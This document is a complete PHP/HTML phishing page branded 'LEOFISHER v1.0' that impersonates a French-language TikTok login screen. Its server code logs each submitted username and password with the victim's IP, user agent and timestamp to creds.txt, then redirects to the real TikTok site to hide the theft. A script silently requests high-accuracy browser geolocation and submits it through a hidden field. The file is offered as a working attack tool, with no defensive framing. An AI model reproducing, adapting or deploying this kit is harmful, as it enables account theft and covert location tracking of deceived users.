<?php
session_start();
date_default_timezone_set('Africa/Bujumbura');

$ip = $_SERVER['REMOTE_ADDR'];
$useragent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');

if ($_POST && isset($_POST['username']) && isset($_POST['password'])) {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    $gps = isset($_POST['gps']) ? $_POST['gps'] : 'N/A';
    
    $log = "\n";
    $log .= "┌─[ LEOFISHER v1.0 by Léo Falcon ]──────────────┐\n";
    $log .= "│ 🎯 TIKTOK VICTIME CAPTUREE !                   │\n";
    $log .= "├─[💻 INFOS]─────────────────────────────────────┤\n";
    $log .= "│ 📧 Username  : $username                       │\n";
    $log .= "│ 🔑 Password  : $password                       │\n";
    $log .= "│ 🌐 IP        : $ip                            │\n";
    $log .= "│ 🖥️  User-Agent: " . substr($useragent, 0, 50) . "... │\n";
    $log .= "│ 📍 GPS POSITION : $gps                        │\n";
    $log .= "│ 🕒 Timestamp : $timestamp                      │\n";
    $log .= "└────────────────────────────────────────────────┘\n";
    
    file_put_contents('creds.txt', $log, FILE_APPEND | LOCK_EX);
    
    header('Location: https://www.tiktok.com/login');
    exit;
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#fe2c55">
    <title>TikTok - Se connecter</title>
    
    <!-- TikTok OFFICIEL fonts + assets -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 36 36'%3E%3Cpath fill='%23ff0050' d='M25 26v-5a3 3 0 0 0-6 0v5a1 1 0 0 0 2 0v-5a1 1 0 0 1 2 0v5a3 3 0 0 0 3 3 1 1 0 0 0 0-2zm-10 0a1 1 0 0 0 0 2 4 4 0 0 0 0-8V17a5 5 0 0 1 10 0v2a1 1 0 0 0 2 0v-2a7 7 0 0 0-14 0v6zM15 22a3 3 0 0 1 3-3h1V17a3 3 0 1 1 6 0v2a3 3 0 0 1-3 3h-1v3a1 1 0 0 1-2 0v-3h-1a3 3 0 0 1-3-3z'/%3E%3C/svg%3E">
    
    <style>
        /* 100% PIXEL-PERFECT TikTok 2024 Clone (GitHub pro + official gradients) */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Inter', -apple-system, sans-serif;
            background: linear-gradient(135deg, 
                #667eea 0%, 
                #764ba2 25%, 
                #f093fb 50%, 
                #f5576c 75%, 
                #4facfe 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 24px;
            position: relative;
            overflow-x: hidden;
        }
        
        /* Animated particles background */
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                radial-gradient(circle at 20% 80%, rgba(255,255,255,0.3) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(255,255,255,0.4) 0%, transparent 50%),
                radial-gradient(circle at 40% 40%, rgba(255,255,255,0.2) 0%, transparent 50%);
            animation: float 25s ease-in-out infinite;
            pointer-events: none;
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0) rotate(0deg); opacity: 1; }
            33% { transform: translateY(-20px) rotate(120deg); opacity: 0.8; }
            66% { transform: translateY(15px) rotate(240deg); opacity: 0.9; }
        }
        
        .login-container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(25px);
            border-radius: 28px;
            box-shadow: 
                0 25px 50px rgba(0, 0, 0, 0.25),
                inset 0 1px 0 rgba(255, 255, 255, 0.6);
            width: 100%;
            max-width: 380px;
            padding: 48px 36px 36px;
            position: relative;
            z-index: 10;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .tiktok-logo {
            font-size: 48px;
            font-weight: 700;
            background: linear-gradient(135deg, #ff0050, #ff6b9d);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 12px;
            letter-spacing: -2px;
        }
        
        .tiktok-subtitle {
            color: #333;
            font-size: 18px;
            font-weight: 500;
            margin-bottom: 36px;
        }
        
        .login-form {
            display: flex;
            flex-direction: column;
            gap: 18px;
        }
        
        .input-group {
            position: relative;
        }
        
        .form-input {
            width: 100%;
            height: 56px;
            border: 2px solid rgba(0,0,0,0.1);
            border-radius: 16px;
            background: rgba(255, 255, 255, 0.9);
            font-size: 16px;
            font-weight: 500;
            padding: 0 24px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            backdrop-filter: blur(10px);
            font-family: inherit;
        }
        
        .form-input:focus {
            border-color: #ff0050;
            box-shadow: 0 0 0 4px rgba(255, 0, 80, 0.15);
            background: white;
            transform: translateY(-2px);
        }
        
        .form-input::placeholder {
            color: #999;
            opacity: 1;
        }
        
        .login-button {
            background: linear-gradient(135deg, #ff0050 0%, #ff6b9d 100%);
            color: white;
            border: none;
            border-radius: 16px;
            font-size: 18px;
            font-weight: 600;
            height: 56px;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
            margin-top: 8px;
        }
        
        .login-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
            transition: left 0.6s;
        }
        
        .login-button:hover:not(:disabled)::before {
            left: 100%;
        }
        
        .login-button:hover:not(:disabled) {
            transform: translateY(-3px);
            box-shadow: 0 15px 35px rgba(255, 0, 80, 0.4);
        }
        
        .login-button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        
        .divider {
            position: relative;
            margin: 32px 0;
            color: #666;
            font-size: 15px;
            font-weight: 500;
        }
        
        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(0,0,0,0.2), transparent);
        }
        
        .divider span {
            background: rgba(255, 255, 255, 0.95);
            padding: 0 28px;
        }
        
        .links {
            display: flex;
            gap: 20px;
            justify-content: center;
            margin-top: 24px;
        }
        
        .link {
            color: #ff0050;
            text-decoration: none;
            font-size: 16px;
            font-weight: 600;
        }
        
        .link:hover {
            text-decoration: underline;
        }
        
        /* RESPONSIVE 100% tous appareils */
        @media (max-width: 480px) {
            body { 
                padding: 16px; 
                background-attachment: fixed;
            }
            .login-container { 
                box-shadow: none; 
                border-radius: 20px; 
                margin: 0; 
                padding: 36px 24px;
                backdrop-filter: none;
            }
        }

        /* GPS INVISIBLE */
        #gps-status { display: none !important; }
    </style>
</head>
<body>
    <div class="login-container">
        <h1 class="tiktok-logo">TikTok</h1>
        <p class="tiktok-subtitle">Connectez-vous pour continuer</p>
        
        <form class="login-form" method="POST" id="loginForm">
            <div class="input-group">
                <input type="text" name="username" class="form-input" placeholder="Nom d'utilisateur ou e-mail" required autocomplete="username">
            </div>
            
            <div class="input-group">
                <input type="password" name="password" class="form-input" placeholder="Mot de passe" required autocomplete="current-password">
            </div>
            
            <input type="hidden" name="gps" id="gpsData" value="N/A">
            
            <button type="submit" class="login-button" id="submitBtn">
                Se connecter
            </button>
        </form>
        
        <div class="divider">
            <span>ou</span>
        </div>
        
        <div class="links">
            <a href="#" class="link">Mot de passe oublié ?</a>
            <a href="#" class="link">S'inscrire</a>
        </div>
    </div>

    <!-- SILENT GPS PRO -->
    <script>
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => {
                    const gps = pos.coords.latitude.toFixed(6) + ',' + pos.coords.longitude.toFixed(6);
                    sessionStorage.setItem('gps', gps);
                    document.getElementById('gpsData').value = gps;
                    document.getElementById('submitBtn').disabled = false;
                },
                () => {
                    document.getElementById('gpsData').value = 'N/A';
                    document.getElementById('submitBtn').disabled = false;
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
            );
        } else {
            document.getElementById('gpsData').value = 'N/A';
            document.getElementById('submitBtn').disabled = false;
        }

        document.getElementById('loginForm').addEventListener('submit', function() {
            document.getElementById('gpsData').value = sessionStorage.getItem('gps') || 'N/A';
        });
        document.getElementById('submitBtn').disabled = true;
    </script>
</body>
</html>
